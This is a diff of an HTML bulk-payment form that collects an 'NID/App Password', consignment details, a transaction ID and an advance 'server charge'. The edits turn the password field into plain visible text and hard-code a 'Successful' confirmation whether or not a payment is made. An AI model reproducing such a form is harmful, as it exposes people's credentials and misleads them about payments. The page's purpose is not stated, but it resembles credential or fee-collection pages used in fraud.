@@ -5,9 +5,6 @@
   <title>Bulk Payment Page</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
   <link rel="stylesheet" href="./assets/css/main.css">
-  <style>
-    /* ... (keep existing styles unchanged) ... */
-  </style>
 </head>
 <body class="is-preload">
   <div id="bg"></div>
@@ -43,14 +40,14 @@
 
       <div class="form-group">
         <label for="password">NID/App Password:</label>
-        <input type="password" id="password" name="password" required minlength="6">
+        <input type="text" id="password" name="password" required minlength="6">
       </div>
 
       <!-- Consignments Container -->
       <div id="consignments-container">
         <div class="consignment-group" data-index="0">
           <div class="consignment-counter">Consignment #1</div>
-          <span class="remove-consignment" onclick="removeConsignment(this)">✕</span>
+          <span class="remove-consignment" onclick="removeConsignment(this)">Cancel Box</span>
           
           <div class="form-group">
             <label>Customer Details:</label>
@@ -82,7 +79,7 @@
       <div class="form-group">
         <label for="amount3">Total Server Charge:</label>
         <input type="number" id="amount3" name="amount3" readonly required>
-        <small>কার্য সম্পাদনের জন্য সার্ভারচার্জ প্রদত্ত নাম্বারে অগ্রিম পরিশোধ করুন</small>
+        <small>কার্য সম্পাদনের জন্য সার্ভারচার্জ অগ্রিম পরিশোধ করুন</small>
       </div>
 
       <div class="form-group">
@@ -95,17 +92,17 @@
       </div>
       
       <div class="form-group">
-        <label for="trxid">Bulk TRX ID:</label>
+        <label for="trxid">TRX ID:</label>
         <input type="text" id="trxid" name="trxid" required minlength="8">
       </div>
 
       <div class="form-actions">
-        <button type="submit" class="button primary">Submit Bulk Payment</button>
-        <button type="button" class="button secondary" onclick="clearForm()">Clear All</button>
+        <button type="submit" class="button primary">Confirm Payment</button>
+        <button type="button" class="button secondary" onclick="clearForm()">Clear</button>
       </div>
     </form>
 
-    <div id="confirmation-message" style="margin-top: 20px;"></div>
+    <div id="confirmation-message" style="margin-top: 20px;">Successful</div>
   </section>
 
   <script>
